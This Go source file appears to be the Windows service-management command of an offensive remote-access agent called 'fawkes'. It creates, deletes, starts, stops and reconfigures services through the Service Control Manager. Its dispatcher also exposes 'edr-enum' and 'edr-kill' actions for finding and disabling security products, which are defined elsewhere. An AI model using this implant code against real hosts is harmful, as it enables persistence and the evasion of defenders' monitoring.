//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

type ServiceCommand struct{}

func (c *ServiceCommand) Name() string {
	return "service"
}

func (c *ServiceCommand) Description() string {
	return "Manage Windows services via SCM API (query, start, stop, restart, create, delete, list, enable, disable)"
}

type serviceArgs struct {
	Action  string `json:"action"`
	Name    string `json:"name"`
	BinPath string `json:"binpath"`
	Display string `json:"display"`
	Start   string `json:"start"`
	Confirm string `json:"confirm"`
}

func (c *ServiceCommand) Execute(task structs.Task) structs.CommandResult {
	var args serviceArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (action, name)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "query":
		return serviceQuery(args)
	case "start":
		return serviceStart(args)
	case "stop":
		return serviceStop(args)
	case "restart":
		return serviceRestart(args)
	case "create":
		return serviceCreate(args)
	case "delete":
		return serviceDelete(args)
	case "list":
		return serviceList()
	case "enable":
		return serviceSetStartType(args, mgr.StartAutomatic)
	case "disable":
		return serviceSetStartType(args, mgr.StartDisabled)
	case "edr-enum":
		return serviceEdrEnumWindows()
	case "edr-kill":
		return serviceEdrKillWindows(args)
	default:
		return errorf("Unknown action: %s. Use: query, start, stop, restart, create, delete, list, enable, disable, edr-enum, edr-kill", args.Action)
	}
}

func serviceQuery(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for service query")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	status, err := s.Query()
	if err != nil {
		return errorf("Error querying service '%s': %v", args.Name, err)
	}

	config, err := s.Config()
	if err != nil {
		return errorf("Error getting config for '%s': %v", args.Name, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Service '%s':\n", args.Name))
	sb.WriteString(strings.Repeat("-", 50) + "\n")
	sb.WriteString(fmt.Sprintf("  State:         %s\n", describeServiceState(status.State)))
	if status.ProcessId != 0 {
		sb.WriteString(fmt.Sprintf("  PID:           %d\n", status.ProcessId))
	}
	sb.WriteString(fmt.Sprintf("  Accepts:       %s\n", describeAcceptedControls(status.Accepts)))
	sb.WriteString("\nConfiguration:\n")
	sb.WriteString(fmt.Sprintf("  Display Name:  %s\n", config.DisplayName))
	sb.WriteString(fmt.Sprintf("  Binary Path:   %s\n", config.BinaryPathName))
	sb.WriteString(fmt.Sprintf("  Start Type:    %s\n", describeStartType(config.StartType)))
	sb.WriteString(fmt.Sprintf("  Service Type:  %s\n", describeServiceType(config.ServiceType)))
	sb.WriteString(fmt.Sprintf("  Account:       %s\n", config.ServiceStartName))
	if config.Description != "" {
		sb.WriteString(fmt.Sprintf("  Description:   %s\n", config.Description))
	}
	if len(config.Dependencies) > 0 {
		sb.WriteString(fmt.Sprintf("  Dependencies:  %s\n", strings.Join(config.Dependencies, ", ")))
	}

	return successResult(sb.String())
}

func serviceStart(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to start a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	err = s.Start()
	if err != nil {
		return errorf("Error starting service '%s': %v", args.Name, err)
	}

	return successf("Started service '%s'", args.Name)
}

func serviceStop(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to stop a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	status, err := s.Control(svc.Stop)
	if err != nil {
		return errorf("Error stopping service '%s': %v", args.Name, err)
	}

	return successf("Stopped service '%s' (state: %s)", args.Name, describeServiceState(status.State))
}

func serviceRestart(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to restart a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	// Stop the service
	_, err = s.Control(svc.Stop)
	if err != nil {
		return errorf("Error stopping service '%s': %v", args.Name, err)
	}

	// Wait for the service to stop (up to 30 seconds)
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		status, qErr := s.Query()
		if qErr != nil {
			return errorf("Error querying service '%s': %v", args.Name, qErr)
		}
		if status.State == svc.Stopped {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	// Start the service
	err = s.Start()
	if err != nil {
		return errorf("Service '%s' stopped but failed to start: %v", args.Name, err)
	}

	return successf("Restarted service '%s'", args.Name)
}

func serviceCreate(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for service creation")
	}
	if args.BinPath == "" {
		return errorResult("Error: binpath is required for service creation")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	startType := mgr.StartManual
	switch strings.ToLower(args.Start) {
	case "auto":
		startType = mgr.StartAutomatic
	case "disabled":
		startType = mgr.StartDisabled
	}

	displayName := args.Display
	if displayName == "" {
		displayName = args.Name
	}

	s, err := m.CreateService(args.Name, args.BinPath, mgr.Config{
		StartType:   uint32(startType),
		DisplayName: displayName,
	})
	if err != nil {
		return errorf("Error creating service '%s': %v", args.Name, err)
	}
	defer s.Close()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Created service '%s':\n", args.Name))
	sb.WriteString(fmt.Sprintf("  Binary Path:  %s\n", args.BinPath))
	sb.WriteString(fmt.Sprintf("  Display Name: %s\n", displayName))
	startTypeStr := "Manual"
	switch startType {
	case mgr.StartAutomatic:
		startTypeStr = "Automatic"
	case mgr.StartDisabled:
		startTypeStr = "Disabled"
	}
	sb.WriteString(fmt.Sprintf("  Start Type:   %s\n", startTypeStr))

	return successResult(sb.String())
}

func serviceDelete(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for service deletion")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	err = s.Delete()
	if err != nil {
		return errorf("Error deleting service '%s': %v", args.Name, err)
	}

	return successf("Deleted service '%s'", args.Name)
}

// serviceSetStartType changes a service's start type (enable=auto, disable=disabled).
func serviceSetStartType(args serviceArgs, startType uint32) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	cfg, err := s.Config()
	if err != nil {
		return errorf("Error reading config for '%s': %v", args.Name, err)
	}

	oldType := startTypeToString(cfg.StartType)
	cfg.StartType = startType

	if err := s.UpdateConfig(cfg); err != nil {
		return errorf("Error updating service '%s': %v", args.Name, err)
	}

	newType := startTypeToString(startType)
	return successf("Service '%s': start type changed from %s to %s", args.Name, oldType, newType)
}

func startTypeToString(st uint32) string {
	switch st {
	case uint32(mgr.StartAutomatic):
		return "Automatic"
	case uint32(mgr.StartManual):
		return "Manual"
	case uint32(mgr.StartDisabled):
		return "Disabled"
	default:
		return fmt.Sprintf("Unknown(%d)", st)
	}
}

// serviceListEntry is the JSON output format for browser script rendering
type serviceListEntry struct {
	Name        string `json:"name"`
	State       string `json:"state"`
	DisplayName string `json:"display_name"`
}

func serviceList() structs.CommandResult {
	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	names, err := m.ListServices()
	if err != nil {
		return errorf("Error listing services: %v", err)
	}

	output := make([]serviceListEntry, 0, len(names))
	for _, name := range names {
		s, sErr := m.OpenService(name)
		if sErr != nil {
			output = append(output, serviceListEntry{Name: name, State: "error"})
			continue
		}

		state := "unknown"
		status, qErr := s.Query()
		if qErr == nil {
			state = describeServiceState(status.State)
		}

		displayName := name
		config, cErr := s.Config()
		if cErr == nil && config.DisplayName != "" {
			displayName = config.DisplayName
		}

		s.Close()
		output = append(output, serviceListEntry{
			Name:        name,
			State:       state,
			DisplayName: displayName,
		})
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error: %v", err)
	}

	return successResult(string(jsonBytes))
}

func describeServiceState(state svc.State) string {
	switch state {
	case svc.Stopped:
		return "Stopped"
	case svc.StartPending:
		return "Starting"
	case svc.StopPending:
		return "Stopping"
	case svc.Running:
		return "Running"
	case svc.ContinuePending:
		return "Continuing"
	case svc.PausePending:
		return "Pausing"
	case svc.Paused:
		return "Paused"
	default:
		return fmt.Sprintf("Unknown(%d)", state)
	}
}

func describeStartType(startType uint32) string {
	switch startType {
	case 0: // SERVICE_BOOT_START
		return "Boot"
	case 1: // SERVICE_SYSTEM_START
		return "System"
	case 2: // SERVICE_AUTO_START
		return "Automatic"
	case 3: // SERVICE_DEMAND_START
		return "Manual"
	case 4: // SERVICE_DISABLED
		return "Disabled"
	default:
		return fmt.Sprintf("Unknown(%d)", startType)
	}
}

func describeServiceType(serviceType uint32) string {
	switch {
	case serviceType&0x10 != 0: // SERVICE_WIN32_OWN_PROCESS
		return "Win32 Own Process"
	case serviceType&0x20 != 0: // SERVICE_WIN32_SHARE_PROCESS
		return "Win32 Shared Process"
	case serviceType&0x01 != 0: // SERVICE_KERNEL_DRIVER
		return "Kernel Driver"
	case serviceType&0x02 != 0: // SERVICE_FILE_SYSTEM_DRIVER
		return "File System Driver"
	default:
		return fmt.Sprintf("0x%x", serviceType)
	}
}

func describeAcceptedControls(accepts svc.Accepted) string {
	var parts []string
	if accepts&svc.AcceptStop != 0 {
		parts = append(parts, "Stop")
	}
	if accepts&svc.AcceptPauseAndContinue != 0 {
		parts = append(parts, "Pause/Continue")
	}
	if accepts&svc.AcceptShutdown != 0 {
		parts = append(parts, "Shutdown")
	}
	if len(parts) == 0 {
		return "none"
	}
	return strings.Join(parts, ", ")
}
